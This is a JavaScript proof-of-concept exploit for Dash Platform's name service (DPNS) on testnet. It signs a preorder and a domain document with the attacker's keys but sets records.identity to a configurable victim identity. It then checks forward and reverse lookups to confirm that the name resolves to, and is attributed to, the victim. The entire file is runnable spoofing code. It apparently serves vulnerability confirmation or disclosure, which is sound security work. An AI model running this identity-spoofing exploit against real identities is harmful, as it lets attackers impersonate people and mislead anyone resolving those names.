/**
 * PoC: DPNS Identity Spoofing
 *
 * Demonstrates that an attacker can register a DPNS domain with records.identity
 * pointing to a victim's identity, rather than their own. The DPNS contract trigger
 * does not validate that records.identity matches the $ownerId (signing identity).
 *
 * Expected bug behavior:
 *   - sdk.dpns.usernames({ identityId: VICTIM_ID }) returns the attacker-registered name
 *   - sdk.dpns.resolveName(NAME) returns VICTIM_ID, not the attacker's ID
 *
 * Setup:
 *   PLATFORM_MNEMONIC = attacker's mnemonic
 *   VICTIM_IDENTITY_ID = any valid identity ID on-chain (the victim)
 *   POC_NAME = the name to register (must be unique on testnet)
 */

import {
  Document,
  DocumentCreateTransition,
  BatchTransition,
  BatchedTransition,
  PrivateKey,
} from '@dashevo/evo-sdk';
import { setupDashClient } from './setupDashClient.mjs';

// -------------------------------------------------------------------------
// Configuration
// -------------------------------------------------------------------------

// The attacker controls this identity (loaded from PLATFORM_MNEMONIC)
// The victim is any existing identity on-chain whose ID we spoof in records.identity
const VICTIM_IDENTITY_ID =
  process.env.VICTIM_IDENTITY_ID ||
  '5BZZFBT7rBZH7GF9sTPjZPMHtrVL9JnsXinqFs2wKSEk';

// Name to register (must not already exist).
// Must match DPNS label regex (Base58 chars + hyphens, no i/l/o).
// Use a long, random-looking name to avoid the contested-name fee.
const _ts = Date.now().toString(36).replace(/[ilo]/g, 'x');
const POC_NAME = process.env.POC_NAME || `spftest-${_ts}-zzz`;

// DPNS contract ID on testnet
const DPNS_CONTRACT_ID = 'GWRSAVFMjXx8HpQFaNJMqBV7MBgMK4br5UESsB4S31Ec';
const PARENT_DOMAIN = 'dash';

// -------------------------------------------------------------------------
// Main
// -------------------------------------------------------------------------

const { sdk, keyManager } = await setupDashClient();
const {
  identity: attackerIdentity,
  identityKey,
  signer,
} = await keyManager.getAuth();

console.log('=== DPNS Identity Spoofing PoC ===\n');
console.log('Attacker identity ID:', attackerIdentity.id.toString());
console.log('Victim  identity ID: ', VICTIM_IDENTITY_ID);
console.log('Name to register:    ', `${POC_NAME}.${PARENT_DOMAIN}`);
console.log('');

// -------------------------------------------------------------------------
// Step 1: Try high-level SDK first (may or may not accept records.identity)
// -------------------------------------------------------------------------

// The evo-sdk registerName sets records.identity internally from the identity
// argument. To spoof, we need to go low-level and submit a raw DPNS domain
// document with records.identity set to the victim's ID.

console.log(
  'Step 1: Submitting raw DPNS domain document with spoofed records.identity...\n',
);

try {
  const w = await sdk.getWasmSdkConnected();

  // records.identity must be a 32-byte Uint8Array (base58-decoded)
  // Inline base58 decode — no extra dependency needed
  const BASE58_ALPHABET =
    '123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz';
  function base58Decode(str) {
    let num = 0n;
    for (const ch of str) {
      const idx = BASE58_ALPHABET.indexOf(ch);
      if (idx < 0) throw new Error(`Invalid base58 char: ${ch}`);
      num = num * 58n + BigInt(idx);
    }
    const hex = num.toString(16).padStart(64, '0');
    return Uint8Array.from(Buffer.from(hex, 'hex'));
  }
  const victimId = base58Decode(VICTIM_IDENTITY_ID);

  // Build the preorder salt and hash (required by DPNS)
  const crypto = await import('crypto');

  const normalizedLabel = POC_NAME.toLowerCase();
  const normalizedParentDomain = PARENT_DOMAIN.toLowerCase();
  const fullDomain = `${normalizedLabel}.${normalizedParentDomain}`;

  const preorderSalt = crypto.randomBytes(32);

  // Double-SHA256 of (salt || fullDomain bytes) — matches wasm-dpp hash()
  const inner = crypto
    .createHash('sha256')
    .update(Buffer.concat([preorderSalt, Buffer.from(fullDomain)]))
    .digest();
  const saltedDomainHash = crypto.createHash('sha256').update(inner).digest();

  // --- Step 1a: Submit preorder document (signed by attacker) ---
  console.log('Step 1a: Submitting preorder document...');

  const preorderDoc = new Document({
    properties: {
      saltedDomainHash: saltedDomainHash,
    },
    documentTypeName: 'preorder',
    dataContractId: DPNS_CONTRACT_ID,
    ownerId: attackerIdentity.id,
  });

  const preorderNonce = await w.getIdentityContractNonce(
    attackerIdentity.id,
    DPNS_CONTRACT_ID,
  );
  const preorderNextNonce = (preorderNonce ?? 0n) + 1n;

  const preorderCreateTx = new DocumentCreateTransition({
    document: preorderDoc,
    identityContractNonce: preorderNextNonce,
  });

  const preorderBatch = BatchTransition.fromBatchedTransitions(
    [new BatchedTransition(preorderCreateTx.toDocumentTransition())],
    attackerIdentity.id,
    0,
  );

  const preorderSt = preorderBatch.toStateTransition();
  const attackerPrivKey = PrivateKey.fromWIF(
    keyManager.keys.auth.privateKeyWif,
  );
  preorderSt.sign(attackerPrivKey, identityKey);

  const preorderHash = preorderSt.hash(false);
  await sdk.stateTransitions.broadcastStateTransition(preorderSt);
  await sdk.stateTransitions.waitForStateTransitionResult(preorderHash);
  console.log('Preorder submitted successfully.\n');

  // --- Step 1b: Submit domain document with records.identity = VICTIM ---
  console.log(
    'Step 1b: Submitting domain document with records.identity = VICTIM...',
  );

  const domainDoc = new Document({
    properties: {
      label: POC_NAME,
      normalizedLabel,
      parentDomainName: PARENT_DOMAIN,
      normalizedParentDomainName: normalizedParentDomain,
      preorderSalt: preorderSalt,
      records: {
        identity: victimId, // <-- SPOOFED: attacker sets this to victim's ID
      },
      subdomainRules: {
        allowSubdomains: false,
      },
    },
    documentTypeName: 'domain',
    dataContractId: DPNS_CONTRACT_ID,
    ownerId: attackerIdentity.id, // attacker owns the document
  });

  const domainNonce = await w.getIdentityContractNonce(
    attackerIdentity.id,
    DPNS_CONTRACT_ID,
  );
  const domainNextNonce = (domainNonce ?? 0n) + 1n;

  const domainCreateTx = new DocumentCreateTransition({
    document: domainDoc,
    identityContractNonce: domainNextNonce,
  });

  const domainBatch = BatchTransition.fromBatchedTransitions(
    [new BatchedTransition(domainCreateTx.toDocumentTransition())],
    attackerIdentity.id,
    0,
  );

  const domainSt = domainBatch.toStateTransition();
  domainSt.sign(attackerPrivKey, identityKey);

  const domainHash = domainSt.hash(false);
  await sdk.stateTransitions.broadcastStateTransition(domainSt);
  const domainResult =
    await sdk.stateTransitions.waitForStateTransitionResult(domainHash);

  console.log('Domain document submitted. Result:', domainResult.toJSON());
  console.log('');

  // -------------------------------------------------------------------------
  // Step 2: Verify the spoofing
  // -------------------------------------------------------------------------

  console.log('Step 2: Verifying spoofing via lookups...\n');

  // Forward lookup: does the name resolve to the VICTIM?
  const resolvedId = await sdk.dpns.resolveName(`${POC_NAME}.${PARENT_DOMAIN}`);
  console.log(
    `Forward lookup  sdk.dpns.resolveName("${POC_NAME}.${PARENT_DOMAIN}"):`,
  );
  console.log('  Resolved to:', resolvedId?.toString());
  console.log('  Expected (victim):', VICTIM_IDENTITY_ID);
  const forwardSpoofed = resolvedId?.toString() === VICTIM_IDENTITY_ID;
  console.log(
    '  Forward spoofing confirmed:',
    forwardSpoofed ? 'YES ✓ BUG' : 'NO',
  );
  console.log('');

  // Reverse lookup: does the victim appear to own the name?
  const victimNames = await sdk.dpns.usernames({
    identityId: VICTIM_IDENTITY_ID,
  });
  console.log(
    `Reverse lookup  sdk.dpns.usernames({ identityId: "${VICTIM_IDENTITY_ID}" }):`,
  );
  console.log('  Names returned:', victimNames);
  const reverseSpoofed =
    Array.isArray(victimNames) &&
    victimNames.some((n) => n?.toString().includes(POC_NAME));
  console.log(
    '  Reverse spoofing confirmed:',
    reverseSpoofed ? 'YES ✓ BUG' : 'NO (check raw output above)',
  );
  console.log('');

  // Confirm attacker does NOT own the name per records.identity
  const attackerNames = await sdk.dpns.usernames({
    identityId: attackerIdentity.id.toString(),
  });
  console.log('Attacker names (by identity ID):', attackerNames);
  console.log('');

  if (forwardSpoofed || reverseSpoofed) {
    console.log('=== RESULT: BUG CONFIRMED ===');
    console.log(
      `Name "${POC_NAME}.${PARENT_DOMAIN}" was registered by attacker (${attackerIdentity.id})`,
    );
    console.log(
      `but resolves to / is attributed to victim (${VICTIM_IDENTITY_ID})`,
    );
  } else {
    console.log(
      '=== RESULT: Bug NOT confirmed (trigger may have rejected the document) ===',
    );
    console.log('Check the raw output above for error details.');
  }
} catch (e) {
  console.error('Error during PoC execution:', e.message);
  if (
    e.message?.includes('trigger') ||
    e.message?.includes('records.identity') ||
    e.message?.includes('owner')
  ) {
    console.log(
      '\n=== RESULT: Bug MITIGATED — trigger rejected the spoofed document ===',
    );
  } else {
    console.log('\nThis may be a setup error rather than a trigger rejection.');
  }
  console.error(e);
}
